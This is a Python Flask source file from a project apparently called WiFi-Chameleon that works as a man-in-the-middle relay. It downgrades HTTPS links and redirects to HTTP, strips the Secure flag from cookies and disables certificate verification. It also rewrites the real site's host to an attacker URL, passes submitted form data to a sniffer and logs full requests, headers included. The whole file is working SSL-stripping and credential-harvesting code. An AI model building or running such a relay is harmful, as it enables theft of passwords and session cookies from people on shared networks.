from flask import Flask, request, Response
import requests
from urllib.parse import urlparse
import re
import json
from wifichameleon.utils import util
from wifichameleon.config import PROJ_ROOT, PASSWORD_LOG, RELAY_CACHE
from wifichameleon.relay.sniffer import do_sniff

app = Flask(__name__)
settings = util.read_settings()
real_url = settings['real_url']
attacker_url = settings['attacker_url']
attacker_netloc = urlparse(attacker_url).netloc
real_netloc = urlparse(real_url).netloc

methods = ["GET", "HEAD", "POST", "PUT", "DELETE", "CONNECT", "OPTIONS", "TRACE", "PATCH"]

def is_netloc_chr(num):
    return (48 <= num and num <= 58) or (65 <= num and num <= 90) or (97 <= num and num <= 122) or num == 46

def load_cache():
    netloc_https_enabled = util.safe_json_loads(util.safe_read(PROJ_ROOT+RELAY_CACHE))
    netloc_https_enabled[real_netloc] = True
    return netloc_https_enabled

def write_cache(netloc_https_enabled):
    with open(PROJ_ROOT+RELAY_CACHE, 'w') as ofile:
        ofile.write(json.dumps(netloc_https_enabled))

def replace_https(body):
    current_location = 0
    written = False
    netloc_https_enabled = load_cache()
    while True:
        current_location = body.find(b"http", current_location)
        if current_location == -1:
            if written: write_cache(netloc_https_enabled)
            return body
        has_https = body[current_location+4] == ord('s')
        check_loc = current_location+(5 if has_https else 4)
        if body[check_loc:check_loc+3] == b"://":
            begin_netloc = check_loc+3
        elif body[check_loc:check_loc+12].decode().lower() == "\\x3a\\x2f\\x2f":
            begin_netloc = check_loc+12
        else:
            current_location = check_loc
            continue
        end_netloc = begin_netloc+1
        while is_netloc_chr(body[end_netloc]):
            end_netloc += 1
        netloc = body[begin_netloc:end_netloc].decode()
        if netloc not in netloc_https_enabled:
            netloc_https_enabled[netloc] = has_https
            written = True
        if has_https:
            body = body[:current_location+4] + body[current_location+5:]
        current_location = begin_netloc

def do_request(url, headers, query, method, body, path):
    has_https = url[4] == 's'
    failed = False
    with open("/home/pi/WiFi-Chameleon/data/test.log", 'a') as ofile:
        ofile.write(f"Request: {method} {url} {path} {query} {headers} {body}\n")
    try:
        r = requests.request(method, headers=headers, url=url+"/"+path, data=body, params=query, verify=False, stream=True, allow_redirects=False)
    except:
        failed = True
    if failed:
        try:
            if has_https:
                url = url[:4] + url[5:]
            else:
                url = url[:4] + "s" + url[4:]
            r = requests.request(method, headers=headers, url=url+"/"+path, data=body, params=query, verify=False, stream=True, allow_redirects=False)
        except:
            resp = Response()
            resp.status_code = 404
            return resp
    headers = r.headers
    length = 0
    # Handle redirect
    if 'Location' in headers:
        to_url = headers['Location']
        parsed_to_url = urlparse(to_url)
        to_netloc = parsed_to_url.netloc
        netloc_https_enabled = load_cache()
        if to_netloc not in netloc_https_enabled:
            netloc_https_enabled[to_netloc] = parsed_to_url.scheme.lower() == "https"
            write_cache(netloc_https_enabled)
        headers['Location'] = headers['Location'].replace("https://", "http://")
    # Handle body
    if 'Content-Length' in headers:
        length = int(headers['Content-Length'])
        del headers['Content-Length']
    # Handle cookie
    if 'Set-Cookie' in headers:
        headers['Set-Cookie'] = headers['Set-Cookie'].replace("Secure;", "")
    body = b""
    if length > 0:
        body = r.raw.read(length)
    elif 'Transfer-Encoding' in headers and headers['Transfer-Encoding'] == 'chunked':
        body = b''.join(r.iter_content())
    if len(body) > 0:
        if 'Content-Type' in headers and 'text' in headers['Content-Type']:
            body = replace_https(body)
        else:
            body = body.replace(real_netloc.encode(), attacker_netloc.encode())
        if 'Content-Encoding' in headers:
            del headers['Content-Encoding']
    resp = Response()
    resp.data = body
    for key in headers.keys():
        resp.headers[key] = headers[key]
    resp.status_code = r.status_code
    return resp

@app.route("/", methods=methods)
def home():
    netloc_https_enabled = load_cache()
    path = ""
    headers = dict(request.headers)
    netloc = headers['Host']
    https_enabled = False
    if netloc in netloc_https_enabled:
        https_enabled = netloc_https_enabled[netloc]
    url = ("https://" if https_enabled else "http://") + netloc
    del headers['Host']
    query = dict(request.args)
    method = request.method
    body = dict(request.form)
    do_sniff(real_netloc, body)
    return do_request(url, headers, query, method, body, path)

@app.route('/<path:dummy>', methods=methods)
def fallback(dummy):
    netloc_https_enabled = load_cache()
    path = dummy
    headers = dict(request.headers)
    netloc = headers['Host']
    https_enabled = False
    if netloc in netloc_https_enabled:
        https_enabled = netloc_https_enabled[netloc]
    url = ("https://" if https_enabled else "http://") + netloc
    del headers['Host']
    query = dict(request.args)
    method = request.method
    body = dict(request.form)
    do_sniff(netloc, body)
    return do_request(url, headers, query, method, body, path)